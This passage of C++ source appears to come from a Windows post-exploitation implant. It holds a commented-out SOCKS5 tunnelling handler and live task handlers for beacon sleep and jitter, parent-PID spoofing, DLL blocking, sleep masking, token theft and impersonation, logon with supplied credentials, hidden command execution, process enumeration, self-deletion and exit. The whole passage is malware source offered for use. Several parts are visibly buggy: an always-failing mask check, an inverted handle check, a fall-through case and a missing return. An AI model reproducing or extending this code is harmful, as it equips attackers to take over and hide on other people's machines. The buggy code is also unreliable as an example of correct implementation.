//     ULONG B64DataLen = 0;
    
//     if ( !IsExit ) {
        
//         B64Data = Self->Psr->Bytes( Parser, &B64DataLen );
//         DataLen = Self->Pkg->Base64DecSize((PCHAR)B64Data );
//         Data = (BYTE*)hAlloc( DataLen );
//         if (!Data) {
//             KhDbg("SOCKS5: ERROR: Allocation failed (Size=%u)", DataLen);
//             return ERROR_OUTOFMEMORY;
//         }
//         base64_decode((PCHAR)B64Data, (PUCHAR)Data, DataLen);
//         KhDbg("SOCKS5: Decoded data (Size=%u)", DataLen);
//     }

//     Self->Sckt->LogData("received data", Data, DataLen);

//     BYTE Socks5FastResponse[10] = {0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
//     BYTE* ResponseData = nullptr;
//     u_long  IoBool = 1;
//     ULONG ResponseLen = 0;
//     addrinfo  Hints = { 0 };
//     addrinfo* Rest  = { 0 };
//     sockaddr_in targetAddr = { 0 };
//     BYTE  AddrType  = 0;
//     ERROR_CODE Result = ERROR_SUCCESS;
//     ULONG Operation = 0;
//     ULONG targetIP = 0;
//     USHORT targetPort = 0;

//     if ( IsExit ) {
//         Operation = KH_SOCKET_CLOSE;
//         KhDbg("SOCKS5: Operation CLOSE (ServerID=%u)", ServerID);
//     } else if ( Self->Sckt->Exist( ServerID ) ) {
//         Operation = KH_SOCKET_DATA;
//         KhDbg("SOCKS5: Operation DATA (ServerID=%u)", ServerID);
//     } else {
//         Operation = KH_SOCKET_NEW;
//         KhDbg("SOCKS5: Operation NEW (ServerID=%u)", ServerID);
//     }

//     switch (Operation) {
//         case KH_SOCKET_NEW: {
//             KhDbg("SOCKS5: Creating new socket");
//             SOCKET newSocket = Self->Ws2_32.WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0);
//             if (newSocket == INVALID_SOCKET) {
//                 KhDbg("SOCKS5: ERROR: Socket creation failed (Code=0x%X)", KhGetError);
//                 return KhGetError;
//             }

//             AddrType = Data[3];
//             targetAddr.sin_family = AF_INET;

//             KhDbg("type: %X", AddrType);
            
//             if (AddrType == 0x01) { // IPv4 
//                 targetIP = *(ULONG*)(Data + 4);
//                 targetPort = *(USHORT*)(Data + 8);

//                 targetAddr.sin_port = targetPort;
//                 targetAddr.sin_addr.s_addr = targetIP;
//             } 
//             else if (AddrType == 0x03) { // Domain
//                 BYTE DomainLen = Data[4];
//                 CHAR DomainName[MAX_PATH] = {0}; 

//                 Mem::Copy(DomainName, (Data + 5), DomainLen);
//                 DomainName[DomainLen] = '\0';

//                 Hints.ai_family = AF_INET;
//                 Hints.ai_socktype = SOCK_STREAM;

//                 int res = Self->Ws2_32.getaddrinfo(DomainName, nullptr, &Hints, &Rest);
//                 if (res != 0) {
//                     KhDbg("SOCKS5: ERROR: Domain resolution failed (Code=0x%X)", res);
//                     Self->Ws2_32.closesocket(newSocket);
//                     return res; 
//                 }

//                 targetAddr.sin_addr.s_addr = ((sockaddr_in*)Rest->ai_addr)->sin_addr.s_addr;
//                 targetPort = *(USHORT*)(Data + 5 + DomainLen); 
//                 targetAddr.sin_port = targetPort;

//                 Self->Ws2_32.freeaddrinfo(Rest);
//             }
            
//             KhDbg("Target: %s:%d", Self->Ws2_32.inet_ntoa(targetAddr.sin_addr), targetPort);

//             BOOL noDelay = TRUE;
//             Self->Ws2_32.setsockopt(newSocket, IPPROTO_TCP, TCP_NODELAY, (char*)&noDelay, sizeof(noDelay));
//             KhDbg("SOCKS5: Socket configured (NoDelay=1)");

//             if (Self->Ws2_32.connect(newSocket, (sockaddr*)&targetAddr, sizeof(targetAddr))) {
//                 KhDbg("SOCKS5: ERROR: Connection failed (Code=0x%X)", KhGetError);
//                 Self->Ws2_32.closesocket(newSocket);
//                 return KhGetError;
//             }

//             if (Self->Ws2_32.ioctlsocket(newSocket, FIONBIO, &IoBool)) {
//                 KhDbg("failed non blocking");
//             }

//             KhDbg("SOCKS5: Connection established");

//             ResponseData = (BYTE*)hAlloc(10);
//             if (!ResponseData) {
//                 KhDbg("SOCKS5: ERROR: Failed to allocate response buffer");
//                 Self->Ws2_32.closesocket(newSocket);
//                 return ERROR_OUTOFMEMORY;
//             }
//             Mem::Copy(ResponseData, Socks5FastResponse, 10);
//             ResponseLen = 10;
//             Self->Sckt->Add(ServerID, newSocket);
//             KhDbg("SOCKS5: Socket added to manager (ID=%u)", ServerID);
//             break;
//         }

//         case KH_SOCKET_DATA: {
//             KhDbg("SOCKS5: Processing data (Size=%u)", DataLen);
//             SOCKET ActiveSock = Self->Sckt->Get( ServerID );
//             if (ActiveSock == INVALID_SOCKET) {
//                 KhDbg("SOCKS5: ERROR: Socket not found (ID=%u)", ServerID);
//                 return ERROR_NOT_FOUND;
//             }

//             ULONG totalSent = 0;
//             while ( totalSent < DataLen ) {
//                 int sent = Self->Ws2_32.send( ActiveSock, (char*)(Data + totalSent), DataLen - totalSent, 0 );
//                 if (sent == SOCKET_ERROR) {
//                     KhDbg("SOCKS5: ERROR: Send failed (Code=0x%X)", KhGetError);
//                     return KhGetError;
//                 }
//                 totalSent += sent;
//                 KhDbg("SOCKS5: Sent %u/%u bytes", totalSent, DataLen);
//             }

//             ULONG TmpLen = 0;
//             BYTE* NewBuff = nullptr;
//             BYTE* TmpBuff = nullptr;

//             do {
//                 if (Self->Ws2_32.ioctlsocket(ActiveSock, FIONREAD, &TmpLen) == SOCKET_ERROR) {
//                     KhDbg("SOCKS5: ERROR: ioctlsocket failed (Code=0x%X)", KhGetError);
//                     break;
//                 }

//                 KhDbg("SOCKS5: FIONREAD returned %u bytes available", TmpLen);

//                 if ( ! TmpLen ) {

//                     KhDbg("trying again with select timeout", TmpLen);

//                     fd_set readSet;
//                     FD_ZERO(&readSet);
//                     FD_SET(ActiveSock, &readSet);

//                     struct timeval timeout = {6, 0}; 

//                     int ready = Self->Ws2_32.select(0, &readSet, NULL, NULL, &timeout);
//                     if (ready <= 0) {
//                         KhDbg("SOCKS5: no data available (timeout/error)");
//                     }

//                     if (Self->Ws2_32.ioctlsocket(ActiveSock, FIONREAD, &TmpLen) == SOCKET_ERROR) {
//                         KhDbg("SOCKS5: ERROR: ioctlsocket failed (Code=0x%X)", KhGetError);
//                         break;
//                     }

//                     KhDbg("SOCKS5: FIONREAD returned %u bytes available", TmpLen);
//                 }

//                 if (TmpLen > 0) {
//                     TmpBuff = (BYTE*)hAlloc( TmpLen );
//                     if (!TmpBuff) {
//                         KhDbg("SOCKS5: ERROR: Failed to allocate buffer for %u bytes", TmpLen);
//                         break;
//                     }

//                     if (!Self->Sckt->RecvAll(ActiveSock, TmpBuff, TmpLen, &TmpLen)) {
//                         KhDbg("SOCKS5: ERROR: RecvAll failed (Code=0x%X)", KhGetError);
//                         hFree(TmpBuff);
//                         break;
//                     }

//                     KhDbg("SOCKS5: Received %u bytes", TmpLen);

//                     if (TmpLen > 0) {
//                         if (!ResponseData) {
//                             ResponseData = TmpBuff;
//                             ResponseLen = TmpLen;
//                             TmpBuff = nullptr;
//                             KhDbg("SOCKS5: Initial response set (%u bytes)", ResponseLen);
//                         } else {
//                             NewBuff = (BYTE*)hAlloc(TmpLen + ResponseLen);
//                             if (!NewBuff) {
//                                 KhDbg("SOCKS5: ERROR: Failed to allocate combined buffer");
//                                 hFree(TmpBuff);
//                                 break;
//                             }

//                             Mem::Copy( NewBuff, ResponseData, ResponseLen );
//                             Mem::Copy( (char*)NewBuff + ResponseLen, TmpBuff, TmpLen );

//                             hFree( ResponseData );
//                             hFree( TmpBuff );

//                             ResponseData = NewBuff;
//                             ResponseLen += TmpLen;
//                             NewBuff = nullptr;

//                             KhDbg("SOCKS5: Appended data (total %u bytes)", ResponseLen);
//                         }
//                     }
//                 }
//             } while (TmpLen > 0);
//             break;
//         }

//         case KH_SOCKET_CLOSE: {
//             KhDbg("SOCKS5: Closing socket (ID=%u)", ServerID);
//             SOCKET sockToClose = Self->Sckt->Get(ServerID);
//             if (sockToClose == INVALID_SOCKET) {
//                 KhDbg("SOCKS5: ERROR: Socket not found (ID=%u)", ServerID);
//                 return ERROR_NOT_FOUND; 
//             }
//             Self->Ws2_32.closesocket(sockToClose);
//             Self->Sckt->RmCtx(ServerID);
//             KhDbg("SOCKS5: Socket closed");
//             break;
//         }
//     }

//     KhDbg("SOCKS5: Preparing response (IsExit=%d, ServerID=%u, ResponseLen=%u)", IsExit, ServerID, ResponseLen);
//     Self->Pkg->Int32( Package, IsExit );
//     Self->Pkg->Int32( Package, ServerID );
    
//     if ( ResponseData && ResponseLen ) {
//         Self->Sckt->LogData("send data", ResponseData, ResponseLen );
//         Self->Pkg->Bytes( Package, ResponseData, ResponseLen );
//         hFree( ResponseData );
//     }
//     if ( Data ) hFree( Data );
    
//     KhDbg("SOCKS5: Operation completed (Result=0x%X)", Result);
//     return Result;
// }

auto DECLFN Task::Config(
    _In_ JOBS* Job
) -> ERROR_CODE {
    PACKAGE* Package = Job->Pkg;
    PARSER*  Parser  = Job->Psr;

    INT32    ConfigCount = Self->Psr->Int32( Parser );
    ULONG    TmpVal      = 0;
    BOOL     Success     = FALSE;

    KhDbg( "config count: %d", ConfigCount );

    for ( INT i = 0; i < ConfigCount; i++ ) {
        UINT8 ConfigID = Self->Psr->Int32( Parser );
        KhDbg( "config id: %d", ConfigID );
        switch ( ConfigID ) {
            case Enm::Config::Ppid: {
                ULONG ParentID = Self->Psr->Int32( Parser );
                Self->Ps->Ctx.ParentID = ParentID;

                KhDbg( "parent id set to %d", Self->Ps->Ctx.ParentID ); 
                
                break;
            }
            case Enm::Config::Sleep: {
                ULONG NewSleep = Self->Psr->Int32( Parser );
                Self->Session.SleepTime = NewSleep * 1000;

                KhDbg( "new sleep time set to %d ms", Self->Session.SleepTime ); 
                
                break;
            }
            case Enm::Config::Jitter: {
                ULONG NewJitter = Self->Psr->Int32( Parser );
                Self->Session.Jitter = NewJitter;

                KhDbg( "new jitter set to %d", Self->Session.Jitter ); 
                
                break;
            }
            case Enm::Config::BlockDlls: {
                BOOL BlockDlls  = Self->Psr->Int32( Parser );
                Self->Ps->Ctx.BlockDlls = BlockDlls;
                
                KhDbg( "block non microsoft dlls is %s", Self->Ps->Ctx.BlockDlls ? "enabled" : "disabled" ); 
                
                break;
            }
            case Enm::Config::CurDir: {
                if ( Self->Ps->Ctx.CurrentDir ) {
                    hFree( Self->Ps->Ctx.CurrentDir );
                }

                PCHAR CurDirTmp  = Self->Psr->Str( Parser, &TmpVal );
                PCHAR CurrentDir = (PCHAR)hAlloc( TmpVal );

                Mem::Copy( CurrentDir, CurDirTmp, TmpVal );

                Self->Ps->Ctx.CurrentDir = CurrentDir; break;
            }
            case Enm::Config::Mask: {
                INT32 TechniqueID = Self->Psr->Int32( Parser );
                if ( 
                    TechniqueID != eMask::Timer || 
                    TechniqueID != eMask::None 
                ) {
                    KhDbg( "invalid mask id: %d", TechniqueID );
                    return KH_ERROR_INVALID_MASK_ID;
                }
            
                Self->Mk->Ctx.TechniqueID = TechniqueID;
            
                KhDbg( 
                    "mask technique id set to %d (%s)", Self->Mk->Ctx.TechniqueID, 
                    Self->Mk->Ctx.TechniqueID   == eMask::Timer ? "timer" : 
                    ( Self->Mk->Ctx.TechniqueID == eMask::None  ? "wait" : "unknown" ) 
                );

                break;
            }
            case Enm::Config::Spawn: {
                // PCHAR Spawn = Self->InjCtx.;
            }
            case Enm::Config::Killdate: {
                SYSTEMTIME LocalTime { 0 };

                INT16 Year  = (INT16)Self->Psr->Int32( Parser );
                INT16 Month = (INT16)Self->Psr->Int32( Parser );
                INT16 Day   = (INT16)Self->Psr->Int32( Parser );

                break;
            }
        }
    }

    return KhRetSuccess;
}

auto DECLFN Task::Token(
    _In_ JOBS* Job
) -> ERROR_CODE {
    PACKAGE* Package = Job->Pkg;
    PARSER*  Parser  = Job->Psr;

    UINT8 SubID = Self->Psr->Int32( Parser );

    Self->Pkg->Byte( Package, SubID );

    KhDbg( "Sub Command ID: %d", SubID );

    switch ( SubID ) {
        case Enm::Token::GetUUID: {
            CHAR*  ProcUser    = nullptr;
            CHAR*  ThreadUser  = nullptr;
            HANDLE TokenHandle = nullptr;

            TokenHandle = Self->Tkn->CurrentThread();
            ThreadUser  = Self->Tkn->GetUser( TokenHandle );
            
            if ( ThreadUser ) {
                Self->Pkg->Str( Package, ThreadUser );
                hFree( ThreadUser );
                Self->Ntdll.NtClose( TokenHandle );

                KhSetError( ERROR_SUCCESS );
            }

            break;
        }
        case Enm::Token::Steal: {
            ULONG ProcessID = Self->Psr->Int32( Parser );
            BOOL  TokenUse  = Self->Psr->Int32( Parser );
            BOOL  Success   = FALSE;

            KhDbg("id: %d use: %s", ProcessID, TokenUse ? "true" : "false");
            TOKEN_NODE* Token = Self->Tkn->Steal( ProcessID );

            if ( ! Token ) {
                Self->Pkg->Int32( Package, FALSE ); break;
            }

            if ( TokenUse ) Self->Tkn->Use( Token->Handle );

            Self->Pkg->Int32( Package, TRUE );

            KhDbg( "Token ID: %d", Token->TokenID );
            KhDbg( "Process ID: %d", Token->ProcessID );
            KhDbg( "User Name: %s", Token->User );
            KhDbg( "Host Name: %d", Token->Host );
            KhDbg( "Handle: %X", Token->Handle );

            Self->Pkg->Int32( Package, Token->TokenID );
            Self->Pkg->Int32( Package, Token->ProcessID );
            Self->Pkg->Str( Package, Token->User );
            Self->Pkg->Str( Package, Token->Host );
            Self->Pkg->Int64( Package, (INT64)Token->Handle );

            break;
        }
        case Enm::Token::Use: {
            HANDLE Token = (HANDLE)Self->Psr->Int32( Parser );
            Self->Pkg->Int32( Package, Self->Tkn->Use( Token ) );
            break;
        }
        case Enm::Token::Rm: {
            ULONG TokenID = Self->Psr->Int32( Parser );
            Self->Pkg->Int32( Package, Self->Tkn->Rm( TokenID ) );  
            break;
        }
        case Enm::Token::Rev2Self: {
            Self->Pkg->Int32( Package, Self->Tkn->Rev2Self() ); break;
        }
        case Enm::Token::Make: {
            CHAR*  UserName    = Self->Psr->Str( Parser, 0 );
            CHAR*  DomainName  = Self->Psr->Str( Parser, 0 );
            CHAR*  Password    = Self->Psr->Str( Parser, 0 );
            HANDLE TokenHandle = nullptr;

            BOOL Success = FALSE;

            Self->Advapi32.LogonUserA( 
                UserName, DomainName, Password, LOGON_NETCREDENTIALS_ONLY, LOGON32_PROVIDER_DEFAULT, &TokenHandle
            );
            if ( ! TokenHandle || TokenHandle != INVALID_HANDLE_VALUE ) {
                break;
            }

            if ( Self->Tkn->Add( TokenHandle, Self->Session.ProcessID ) ) {
                Success = TRUE;
            }

            Self->Pkg->Int32( Package, Success );

            break;
        }
        case Enm::Token::GetPriv: {
            HANDLE TokenHandle = Self->Tkn->CurrentPs();
            Self->Pkg->Int32( Package, Self->Tkn->GetPrivs( TokenHandle ) );
            Self->Ntdll.NtClose( TokenHandle );

            break;
        }
        case Enm::Token::ListPriv: {
            ULONG  PrivListLen = 0;
            PVOID  PrivList    = nullptr;
            HANDLE TokenHandle = Self->Tkn->CurrentPs();

            PrivList = Self->Tkn->ListPrivs( TokenHandle, PrivListLen );

            Self->Pkg->Int32( Package, PrivListLen );

            for ( INT i = 0; i < PrivListLen; i++ ) {
                Self->Tkn->SetPriv( TokenHandle, static_cast<PRIV_LIST**>(PrivList)[i]->PrivName );
                Self->Pkg->Str( Package, static_cast<PRIV_LIST**>(PrivList)[i]->PrivName );
                Self->Pkg->Int32( Package, static_cast<PRIV_LIST**>(PrivList)[i]->Attributes );
                hFree( static_cast<PRIV_LIST**>(PrivList)[i]->PrivName );
            }

            Self->Ntdll.NtClose( TokenHandle );
            hFree( PrivList );

            break;
        }
    }

    return KhGetError;
}

auto DECLFN Task::Process(
    _In_ JOBS* Job
) -> ERROR_CODE {
    PACKAGE* Package     = Job->Pkg;
    PARSER*  Parser      = Job->Psr;
    UINT8    SbCommandID = Self->Psr->Byte( Parser );
    ULONG    TmpVal      = 0;
    BOOL     Success     = FALSE;

    KhDbg( "sub command id: %d", SbCommandID );

    Self->Pkg->Byte( Package, SbCommandID );

    switch ( SbCommandID ) {
        case Enm::Ps::Create: {
            G_PACKAGE = Package;

            CHAR*               CommandLine = Self->Psr->Str( Parser, &TmpVal );
            PROCESS_INFORMATION PsInfo      = { 0 };

            KhDbg("start to run: %s", CommandLine);

            Success = Self->Ps->Create( CommandLine, TRUE, CREATE_NO_WINDOW, &PsInfo );
            if ( !Success ) return KhGetError;

            Self->Pkg->Int32( Package, PsInfo.dwProcessId );
            Self->Pkg->Int32( Package, PsInfo.dwThreadId  );

            if ( Self->Ps->Out.p ) {
                Self->Pkg->Bytes( Package, (UCHAR*)Self->Ps->Out.p, Self->Ps->Out.s );
                hFree( Self->Ps->Out.p );
                Self->Ps->Out.p = nullptr;
            } 
            
            break;
        }
        case Enm::Ps::ListPs: {
            PVOID ValToFree = NULL;
            ULONG ReturnLen = 0;
            ULONG Status    = STATUS_SUCCESS;
            BOOL  Isx64     = FALSE;
            PCHAR UserToken = { 0 };
            ULONG UserLen   = 0;

            CHAR FullPath[MAX_PATH] = { 0 };

            HANDLE TokenHandle   = nullptr;
            HANDLE ProcessHandle = nullptr;

            UNICODE_STRING* CommandLine = { 0 };
            FILETIME        FileTime    = { 0 };
            SYSTEMTIME      CreateTime  = { 0 };

            PSYSTEM_THREAD_INFORMATION  SysThreadInfo = { 0 };
            PSYSTEM_PROCESS_INFORMATION SysProcInfo   = { 0 };

            Self->Ntdll.NtQuerySystemInformation( SystemProcessInformation, 0, 0, &ReturnLen );

            SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)hAlloc( ReturnLen );
            if ( !SysProcInfo ) {}
            
            Status = Self->Ntdll.NtQuerySystemInformation( SystemProcessInformation, SysProcInfo, ReturnLen, &ReturnLen );
            if ( Status != STATUS_SUCCESS ) {}

            ValToFree = SysProcInfo;

            SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_PTR( SysProcInfo ) + SysProcInfo->NextEntryOffset );

            do {
                ProcessHandle = Self->Ps->Open( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, HandleToUlong( SysProcInfo->UniqueProcessId ) );
                if ( Self->Krnl32.K32GetModuleFileNameExA( ProcessHandle, nullptr, FullPath, MAX_PATH ) ) {
                    Self->Pkg->Str( Package, FullPath );
                    Mem::Zero( (UPTR)FullPath, MAX_PATH );
                } else {
                    Self->Pkg->Str( Package, "-" );
                }

                if ( !SysProcInfo->ImageName.Buffer ) {
                    Self->Pkg->Wstr( Package, L"-" );
                } else {
                    Self->Pkg->Wstr( Package, SysProcInfo->ImageName.Buffer );
                }

                CommandLine = (UNICODE_STRING*)hAlloc( sizeof( UNICODE_STRING ) );

                Self->Ntdll.NtQueryInformationProcess( 
                    ProcessHandle, ProcessCommandLineInformation, CommandLine, sizeof( CommandLine ), nullptr 
                );
                if ( CommandLine->Buffer ) {
                    Self->Pkg->Wstr( Package, CommandLine->Buffer );
                } else {
                    Self->Pkg->Wstr( Package, L"-" );
                }

                hFree( CommandLine );
      
                Self->Pkg->Int32( Package, HandleToUlong( SysProcInfo->UniqueProcessId ) );
                Self->Pkg->Int32( Package, HandleToUlong( SysProcInfo->InheritedFromUniqueProcessId ) );
                Self->Pkg->Int32( Package, SysProcInfo->HandleCount );
                Self->Pkg->Int32( Package, SysProcInfo->SessionId );
                Self->Pkg->Int32( Package, SysProcInfo->NumberOfThreads );

                if ( ProcessHandle ) {
                    Self->Tkn->ProcOpen( ProcessHandle, TOKEN_QUERY, &TokenHandle );
                }
                
                UserToken = Self->Tkn->GetUser( TokenHandle );            
                                
                if ( !UserToken ) {
                    Self->Pkg->Str( Package, "-" );
                } else {
                    Self->Pkg->Str( Package, UserToken );
                    hFree( UserToken );
                    Self->Ntdll.NtClose( TokenHandle );
                }
            
                if ( ProcessHandle ) {
                    Self->Krnl32.IsWow64Process( ProcessHandle, &Isx64 );
                }
                
                Self->Pkg->Int32( Package, Isx64 );
                
                SysThreadInfo = SysProcInfo->Threads;
 
                if ( ProcessHandle && ProcessHandle != INVALID_HANDLE_VALUE ) Self->Ntdll.NtClose( ProcessHandle );
            
                SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_PTR( SysProcInfo ) + SysProcInfo->NextEntryOffset );

            } while ( SysProcInfo->NextEntryOffset );

            if ( ValToFree ) hFree( ValToFree );

            break;
        }
    } 

    KhRetSuccess;
}

auto DECLFN Task::SelfDel(
    _In_ JOBS* Job
) -> ERROR_CODE {
    
     Self->Pkg->Int32( Job->Pkg, Self->Usf->SelfDelete() );

     return KhGetError;
}

auto DECLFN Task::Exit(
    _In_ JOBS* Job
) -> ERROR_CODE {
    INT8 ExitType = Self->Psr->Byte( Job->Psr );

    PACKAGE* Package = Self->Pkg->Create( Job->CmdID, Job->UUID );
    Self->Pkg->Transmit( Package, 0, 0 );

    Self->Hp->Clean();

    if ( ExitType == Enm::Exit::Proc ) {
        Self->Ntdll.RtlExitUserProcess( EXIT_SUCCESS );
    } else if ( ExitType == Enm::Exit::Thread ) {
        Self->Ntdll.RtlExitUserThread( EXIT_SUCCESS );
    }

    return KhRetSuccess;
}